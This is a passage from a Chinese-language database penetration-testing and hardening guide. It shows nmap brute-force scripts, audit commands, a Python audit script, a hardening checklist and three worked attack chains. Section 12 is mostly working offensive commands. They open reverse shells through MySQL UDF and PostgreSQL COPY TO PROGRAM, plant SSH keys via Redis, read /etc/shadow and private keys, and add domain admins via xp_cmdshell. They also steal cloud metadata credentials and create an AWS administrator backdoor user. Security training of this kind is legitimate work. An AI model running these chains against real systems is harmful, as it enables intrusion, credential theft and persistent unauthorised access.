# PostgreSQL
nmap -p 5432 --script pgsql-brute 192.168.1.1

# Oracle
nmap -p 1521 --script oracle-brute,oracle-brute-stealth,oracle-enum-users,oracle-sid-brute,oracle-tns-version 192.168.1.1

# MongoDB
nmap -p 27017 --script mongodb-brute,mongodb-databases,mongodb-info 192.168.1.1

# Redis
nmap -p 6379 --script redis-brute,redis-info 192.168.1.1

# CouchDB
nmap -p 5984 --script couchdb-databases,couchdb-stats 192.168.1.1
```

### 11.4 数据库配置审计

```bash
# MySQL 配置审计
mysql_secure_installation --check
# 检查项:
# - 匿名用户
# - 远程 root 登录
# - 测试数据库
# - 密码强度

# 手动审计检查
mysql -u root -p -e "SELECT User, Host, plugin, authentication_string FROM mysql.user;"
mysql -u root -p -e "SHOW VARIABLES LIKE 'have_ssl';"
mysql -u root -p -e "SHOW VARIABLES LIKE 'local_infile';"
mysql -u root -p -e "SHOW VARIABLES LIKE 'secure_file_priv';"
mysql -u root -p -e "SHOW VARIABLES LIKE 'log_bin';"
mysql -u root -p -e "SHOW VARIABLES LIKE 'general_log';"

# PostgreSQL 配置审计
psql -U postgres -c "SELECT * FROM pg_hba_file_rules;"
psql -U postgres -c "SELECT * FROM pg_shadow;"
psql -U postgres -c "SELECT * FROM pg_settings WHERE name IN ('ssl', 'password_encryption', 'log_connections', 'log_disconnections');"
psql -U postgres -c "SELECT * FROM pg_roles WHERE rolcanlogin;"

# MSSQL 配置审计
# 使用 PowerUpSQL
Import-Module PowerUpSQL.psd1
Get-SQLInstanceDomain
Get-SQLServerInfo -Instance "SQL01"
Invoke-SQLAudit -Instance "SQL01"

# 检查 CIS 基准
# 使用 dbatools
Get-DbaCisBenchmark -SqlInstance "SQL01"
```

### 11.5 自动化审计脚本

```python
#!/usr/bin/env python3
"""
数据库安全自动化审计脚本
覆盖 MySQL, PostgreSQL, MSSQL, MongoDB, Redis, Elasticsearch
"""

import socket
import sys
import pymysql
import psycopg2
import pymssql
import pymongo
import redis
import requests
import json

def check_mysql(host, port=3306, user='root', password=''):
    """MySQL 安全审计"""
    issues = []
    try:
        conn = pymysql.connect(host=host, port=port, user=user, password=password)
        cursor = conn.cursor()
        
        # 检查空密码
        cursor.execute("SELECT User, Host FROM mysql.user WHERE authentication_string='' OR authentication_string IS NULL")
        empty_users = cursor.fetchall()
        if empty_users:
            issues.append(f"[HIGH] 空密码用户: {empty_users}")
        
        # 检查远程 root 访问
        cursor.execute("SELECT User, Host FROM mysql.user WHERE User='root' AND Host='%'")
        if cursor.fetchone():
            issues.append("[HIGH] root 允许远程访问")
        
        # 检查 local_infile
        cursor.execute("SHOW VARIABLES LIKE 'local_infile'")
        result = cursor.fetchone()
        if result and result[1] == 'ON':
            issues.append("[MEDIUM] local_infile 已启用")
        
        # 检查 secure_file_priv
        cursor.execute("SHOW VARIABLES LIKE 'secure_file_priv'")
        result = cursor.fetchone()
        if not result or not result[1]:
            issues.append("[HIGH] secure_file_priv 未设置")
        
        # 检查 SSL
        cursor.execute("SHOW VARIABLES LIKE 'have_ssl'")
        result = cursor.fetchone()
        if result and result[1] == 'DISABLED':
            issues.append("[MEDIUM] SSL 未启用")
        
        cursor.close()
        conn.close()
    except Exception as e:
        issues.append(f"[ERROR] 连接失败: {e}")
    
    return issues

def check_postgresql(host, port=5432, user='postgres', password='postgres'):
    """PostgreSQL 安全审计"""
    issues = []
    try:
        conn = psycopg2.connect(host=host, port=port, user=user, password=password)
        cursor = conn.cursor()
        
        # 检查 pg_hba.conf 配置
        cursor.execute("SELECT * FROM pg_hba_file_rules WHERE auth_method = 'trust'")
        trust_entries = cursor.fetchall()
        if trust_entries:
            issues.append(f"[HIGH] 存在 trust 认证条目: {trust_entries}")
        
        # 检查超级用户
        cursor.execute("SELECT usename FROM pg_user WHERE usesuper = true")
        superusers = cursor.fetchall()
        issues.append(f"[INFO] 超级用户: {superusers}")
        
        # 检查 password_encryption
        cursor.execute("SHOW password_encryption")
        enc = cursor.fetchone()
        if enc and enc[0] == 'md5':
            issues.append("[MEDIUM] 使用弱密码加密 (md5)")
        
        # 检查 SSL
        cursor.execute("SHOW ssl")
        ssl = cursor.fetchone()
        if ssl and ssl[0] == 'off':
            issues.append("[MEDIUM] SSL 未启用")
        
        cursor.close()
        conn.close()
    except Exception as e:
        issues.append(f"[ERROR] 连接失败: {e}")
    
    return issues

def check_mongodb(host, port=27017):
    """MongoDB 安全审计"""
    issues = []
    try:
        client = pymongo.MongoClient(host, port, serverSelectionTimeoutMS=5000)
        # 尝试列出数据库 (如果未授权则可以)
        dbs = client.list_database_names()
        if 'admin' in dbs or 'config' in dbs:
            issues.append(f"[HIGH] MongoDB 未授权访问! 可列出的数据库: {dbs}")
        
        # 检查认证
        try:
            admin_db = client['admin']
            users = list(admin_db.command('usersInfo'))
            if not users:
                issues.append("[HIGH] 未配置认证")
        except:
            issues.append("[HIGH] 无法检查认证配置 (可能未授权)")
        
        client.close()
    except Exception as e:
        issues.append(f"[INFO] 可能需要认证: {e}")
    
    return issues

def check_redis(host, port=6379):
    """Redis 安全审计"""
    issues = []
    try:
        r = redis.Redis(host=host, port=port, socket_timeout=5)
        r.ping()
        info = r.info()
        issues.append(f"[INFO] Redis 版本: {info.get('redis_version', 'Unknown')}")
        
        # 检查 requirepass
        config = r.config_get('requirepass')
        if not config.get('requirepass'):
            issues.append("[HIGH] Redis 未设置密码 (requirepass)")
        
        # 检查 protected-mode
        config = r.config_get('protected-mode')
        if config.get('protected-mode') == 'no':
            issues.append("[HIGH] Redis protected-mode 已禁用")
        
        # 检查 bind
        config = r.config_get('bind')
        bind = config.get('bind', '')
        if '0.0.0.0' in bind or not bind:
            issues.append(f"[MEDIUM] Redis 绑定地址: {bind}")
        
        r.close()
    except redis.exceptions.AuthenticationError:
        issues.append("[INFO] Redis 需要密码认证")
    except Exception as e:
        issues.append(f"[ERROR] 连接失败: {e}")
    
    return issues

def check_elasticsearch(host, port=9200):
    """Elasticsearch 安全审计"""
    issues = []
    try:
        r = requests.get(f"http://{host}:{port}/", timeout=5)
        data = r.json()
        issues.append(f"[INFO] ES 版本: {data.get('version', {}).get('number', 'Unknown')}")
        
        # 检查是否需要认证
        r = requests.get(f"http://{host}:{port}/_cat/indices", timeout=5)
        if r.status_code == 200:
            issues.append("[HIGH] Elasticsearch 未授权访问!")
            issues.append(f"[INFO] 索引列表: {r.text[:500]}")
        elif r.status_code == 401:
            issues.append("[INFO] Elasticsearch 需要认证")
        
    except Exception as e:
        issues.append(f"[ERROR] 连接失败: {e}")
    
    return issues

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    
    print(f"\n[*] 审计目标: {target}\n")
    
    print("[*] 检查 MySQL...")
    for issue in check_mysql(target):
        print(f"  {issue}")
    
    print("\n[*] 检查 PostgreSQL...")
    for issue in check_postgresql(target):
        print(f"  {issue}")
    
    print("\n[*] 检查 MongoDB...")
    for issue in check_mongodb(target):
        print(f"  {issue}")
    
    print("\n[*] 检查 Redis...")
    for issue in check_redis(target):
        print(f"  {issue}")
    
    print("\n[*] 检查 Elasticsearch...")
    for issue in check_elasticsearch(target):
        print(f"  {issue}")
```

---

## 12. 实战案例

### 12.1 MySQL → UDF → RCE → 横向 MSSQL → xp_cmdshell → 域控

```bash
# 攻击链: MySQL UDF 提权 → RCE → 横向 MSSQL → xp_cmdshell → 域控

# 阶段 1: MySQL UDF 提权
# 1.1 获取 WebShell 后连接 MySQL
mysql -h 127.0.0.1 -u root -p'weak_password'

# 1.2 确定插件目录和架构
mysql> SHOW VARIABLES LIKE 'plugin_dir';
mysql> SELECT @@version_compile_os, @@version_compile_machine;

# 1.3 编译并上传 UDF DLL
mysql> SELECT 0x7f454c46... INTO DUMPFILE '/usr/lib/mysql/plugin/udf.so';

# 1.4 创建函数并执行
mysql> CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'udf.so';
mysql> SELECT sys_exec('id');
mysql> SELECT sys_exec('bash -c "bash -i >& /dev/tcp/192.168.1.100/4444 0>&1"');

# 阶段 2: 主机信息收集
# 2.1 反弹 Shell 后
id
uname -a
cat /etc/passwd
ifconfig
ip a
netstat -tlnp
ps aux

# 2.2 发现内网
arp -a
cat /etc/hosts
ip route

# 2.3 发现 MSSQL 服务器
for i in $(seq 1 254); do
  timeout 1 bash -c "echo > /dev/tcp/192.168.1.$i/1433" 2>/dev/null && echo "MSSQL: 192.168.1.$i"
done

# 阶段 3: 横向 MSSQL
# 3.1 从配置文件中获取 MSSQL 凭据
cat /var/www/html/config.php
cat /var/www/html/web.config
grep -r "password" /var/www/ --include="*.php" --include="*.config"
grep -r "connectionString" /var/www/ --include="*.php" --include="*.config"

# 3.2 使用 impacket 连接 MSSQL
impacket-mssqlclient sa:'FoundPassword'@192.168.1.10

# 3.3 启用 xp_cmdshell
SQL> EXEC sp_configure 'show advanced options', 1;
SQL> RECONFIGURE;
SQL> EXEC sp_configure 'xp_cmdshell', 1;
SQL> RECONFIGURE;

# 3.4 执行命令
SQL> EXEC xp_cmdshell 'whoami';
SQL> EXEC xp_cmdshell 'whoami /all';
SQL> EXEC xp_cmdshell 'net group "Domain Admins" /domain';

# 阶段 4: 域控攻击
# 4.1 枚举链接服务器
SQL> SELECT * FROM sys.servers;
SQL> SELECT * FROM OPENQUERY("DC_SQL", 'SELECT @@servername');

# 4.2 在链接服务器上执行命令
SQL> EXEC ('EXEC xp_cmdshell ''net user attacker P@ssw0rd! /add /domain''') AT [DC_SQL];
SQL> EXEC ('EXEC xp_cmdshell ''net group "Domain Admins" attacker /add /domain''') AT [DC_SQL];

# 4.3 通过 NTLM 中继到域控
# 在攻击者机器上
impacket-ntlmrelayx -t ldap://dc.domain.com --escalate-user attacker

# 在 MSSQL 上
SQL> EXEC xp_dirtree '\\192.168.1.100\share';

# 4.4 DCSync
impacket-secretsdump domain.com/attacker:'P@ssw0rd!'@dc.domain.com
```

### 12.2 Redis → SSH → 主机 → 云数据库 → IAM → AWS 控制台

```bash
# 攻击链: Redis 未授权 → SSH 密钥写入 → 主机访问 → 云数据库 → IAM 角色 → AWS 控制台

# 阶段 1: Redis 未授权访问
redis-cli -h 192.168.1.1
> INFO
> CONFIG GET dir
> CONFIG GET dbfilename

# 阶段 2: 写入 SSH 公钥
> CONFIG SET dir /root/.ssh/
> CONFIG SET dbfilename authorized_keys
> SET ssh_key "\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ...\n"
> SAVE

# 阶段 3: SSH 登录主机
ssh -i id_rsa root@<授权主机>

# 阶段 4: 发现云数据库
# 4.1 检查 AWS CLI 配置
cat ~/.aws/credentials
cat ~/.aws/config
aws sts get-caller-identity

# 4.2 枚举 RDS
aws rds describe-db-instances --region us-east-1
aws rds describe-db-clusters --region us-east-1

# 4.3 获取 RDS 凭据
# 从应用程序配置中获取
cat /var/www/html/.env
cat /var/www/html/config/database.php

# 从环境变量获取
env | grep -i db
env | grep -i mysql
env | grep -i postgres

# 从 AWS Secrets Manager 获取
aws secretsmanager list-secrets --region us-east-1
aws secretsmanager get-secret-value --secret-id prod/database --region us-east-1

# 阶段 5: 访问云数据库
# 5.1 连接 RDS
mysql -h mydb.xxx.us-east-1.rds.amazonaws.com -u admin -p

# 5.2 提取数据
SELECT * FROM users;
SELECT * FROM sessions;
SELECT * FROM api_keys;

# 阶段 6: IAM 角色利用
# 6.1 检查实例 IAM 角色
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
ROLE_NAME=$(curl http://169.254.169.254/latest/meta-data/iam/security-credentials/)
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME

# 6.2 枚举 IAM 权限
aws iam list-roles
aws iam list-users
aws iam list-attached-role-policies --role-name $ROLE_NAME

# 6.3 创建后门用户
aws iam create-user --user-name support_engineer
aws iam create-login-profile --user-name support_engineer --password 'P@ssw0rd!2024'
aws iam attach-user-policy --user-name support_engineer --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# 6.4 创建访问密钥
aws iam create-access-key --user-name support_engineer

# 6.5 AWS 控制台登录
# 使用创建的凭据登录 AWS 控制台
```

### 12.3 PostgreSQL → COPY RCE → 文件系统 → 凭据窃取 → 内网 → 数据库集群

```bash
# 攻击链: PostgreSQL 弱密码 → COPY RCE → 文件系统 → 凭据窃取 → 内网 → 数据库集群

# 阶段 1: PostgreSQL 暴力破解
hydra -l postgres -P /usr/share/wordlists/rockyou.txt 192.168.1.1 postgres

# 阶段 2: COPY RCE
psql -h 192.168.1.1 -U postgres -d postgres
postgres=# COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/192.168.1.100/4444 0>&1"';

# 阶段 3: 文件系统凭据提取
# 3.1 读取 PostgreSQL 配置
postgres=# SELECT pg_read_file('/var/lib/postgresql/16/main/pg_hba.conf');
postgres=# SELECT pg_read_file('/var/lib/postgresql/16/main/postgresql.conf');

# 3.2 读取应用程序配置
postgres=# SELECT pg_read_file('/var/www/html/.env');
postgres=# SELECT pg_read_file('/var/www/html/config/database.yml');

# 3.3 读取 SSH 密钥
postgres=# SELECT pg_ls_dir('/root/.ssh');
postgres=# SELECT pg_read_file('/root/.ssh/id_rsa');
postgres=# SELECT pg_read_file('/home/deploy/.ssh/id_rsa');

# 阶段 4: 内网横向
# 4.1 通过 dblink 横向到其他 PostgreSQL
postgres=# CREATE EXTENSION dblink;
postgres=# SELECT dblink_connect('host=192.168.1.2 dbname=postgres user=postgres password=postgres');
postgres=# SELECT * FROM dblink('host=192.168.1.2', 'SELECT pg_read_file(''/etc/passwd'')') AS t(c text);

# 4.2 通过 SSH 横向
postgres=# COPY (SELECT '') TO PROGRAM 'ssh -o StrictHostKeyChecking=no -i /tmp/id_rsa deploy@192.168.1.2 "id"';

# 4.3 在远程主机上执行 PostgreSQL 命令
postgres=# COPY (SELECT '') TO PROGRAM 'ssh 192.168.1.2 "psql -U postgres -c \"SELECT pg_read_file(''/etc/shadow'')\""';

# 阶段 5: 数据库集群攻击
# 5.1 发现 PostgreSQL 集群
# 通过 pg_stat_replication 检查复制
postgres=# SELECT * FROM pg_stat_replication;
postgres=# SELECT * FROM pg_stat_wal_receiver;

# 5.2 攻击从服务器
# 从服务器通常有较弱的配置
postgres=# SELECT dblink_connect('host=192.168.1.3 port=5432 dbname=postgres user=replicator password=replicator');
# 通过逻辑复制注入恶意数据

# 5.3 攻击 Patroni/etcd 集群
# 如果使用 Patroni 管理 PostgreSQL 高可用
# 攻击 etcd 获取集群配置
curl http://192.168.1.1:2379/v2/keys/service/batman/leader
curl http://192.168.1.1:2379/v2/keys/service/batman/members
```

---

## 附录 A: 数据库端口速查表

| 数据库 | 默认端口 | 协议 |
|--------|---------|------|
| MySQL/MariaDB | 3306 | TCP |
| PostgreSQL | 5432 | TCP |
| MSSQL | 1433, 1434 (UDP) | TCP/UDP |
| Oracle | 1521, 2483 (SSL) | TCP |
| Oracle RAC | 1521-1630 | TCP |
| MongoDB | 27017, 27018 (SSL) | TCP |
| MongoDB Shard | 27018, 27019 | TCP |
| Redis | 6379 | TCP |
| Redis Sentinel | 26379 | TCP |
| Elasticsearch | 9200, 9300 | TCP |
| Cassandra | 9042, 7000 (internode) | TCP |
| CouchDB | 5984, 5986 (SSL) | TCP |
| Couchbase | 8091, 11210 | TCP |
| InfluxDB | 8086 | TCP |
| Neo4j | 7474, 7687 (Bolt) | TCP |
| ArangoDB | 8529 | TCP |
| RethinkDB | 28015, 8080 | TCP |
| Memcached | 11211 | TCP/UDP |
| Amazon RDS | 3306/5432/1433/1521 | TCP |
| Amazon DynamoDB | 443 (HTTPS API) | TCP |
| Amazon Redshift | 5439 | TCP |
| Amazon DocumentDB | 27017 | TCP |
| Azure Cosmos DB | 443 (HTTPS API) | TCP |
| GCP Cloud SQL | 3306/5432/1433 | TCP |
| GCP Bigtable | 443 (gRPC) | TCP |
| GCP Spanner | 443 (gRPC) | TCP |
| Pinecone | 443 (HTTPS API) | TCP |
| Weaviate | 8080 | TCP |
| Milvus | 19530, 9091 | TCP |
| TimescaleDB | 5432 (PG extension) | TCP |
| ClickHouse | 8123 (HTTP), 9000 (Native) | TCP |
| TiDB | 4000 | TCP |
| CockroachDB | 26257 | TCP |

---

## 附录 B: 数据库安全加固检查清单

```bash
# MySQL 安全加固
- [ ] 运行 mysql_secure_installation
- [ ] 删除匿名用户
- [ ] 禁用远程 root 登录
- [ ] 删除测试数据库
- [ ] 设置 validate_password 策略
- [ ] 禁用 local_infile
- [ ] 设置 secure_file_priv
- [ ] 启用 SSL/TLS
- [ ] 启用审计日志
- [ ] 限制用户最大连接数
- [ ] 启用 general_log 审计
- [ ] 定期备份

# PostgreSQL 安全加固
- [ ] 使用 scram-sha-256 认证
- [ ] 限制 pg_hba.conf 中的 trust 条目
- [ ] 禁用远程超级用户登录
- [ ] 启用 SSL
- [ ] 启用审计日志 (pgaudit)
- [ ] 限制扩展安装
- [ ] 禁用 PL/Python, PL/Perl 等不安全语言
- [ ] 设置 statement_timeout
- [ ] 使用角色管理权限
- [ ] 启用行级安全 (RLS)

# MSSQL 安全加固
- [ ] 禁用 xp_cmdshell
- [ ] 禁用 OLE Automation
- [ ] 禁用 CLR strict security
- [ ] 使用 Windows 认证模式
- [ ] 启用审计 (SQL Server Audit)
- [ ] 限制链接服务器
- [ ] 禁用外部脚本
- [ ] 启用透明数据加密 (TDE)
- [ ] 最小权限原则
- [ ] 限制 SQL Agent 作业权限

# MongoDB 安全加固
- [ ] 启用认证
- [ ] 启用访问控制
- [ ] 启用 TLS/SSL
- [ ] 绑定到 localhost
- [ ] 启用审计日志
- [ ] 禁用服务器端 JavaScript
- [ ] 限制网络访问
- [ ] 启用加密存储引擎

# Redis 安全加固
- [ ] 设置 requirepass
- [ ] 启用 protected-mode
- [ ] 绑定到 127.0.0.1
- [ ] 禁用危险命令 (FLUSHALL, CONFIG, EVAL)
- [ ] 启用 TLS
- [ ] 设置 ACL
- [ ] 禁用或重命名敏感命令
- [ ] 定期备份 RDB
```

---

## 附录 C: 参考资源

- OWASP SQL Injection Prevention Cheat Sheet
- OWASP NoSQL Injection
- CIS Benchmarks for MySQL, PostgreSQL, MSSQL, MongoDB, Oracle
- AWS RDS Security Best Practices
- Azure SQL Database Security
- GCP Cloud SQL Security
- MITRE ATT&CK - TA0040 (Impact) / T1565 (Data Manipulation)
- CVE Details: Database CVEs
- HackTricks: SQL Injection / NoSQL Injection
- PayloadsAllTheThings: SQL Injection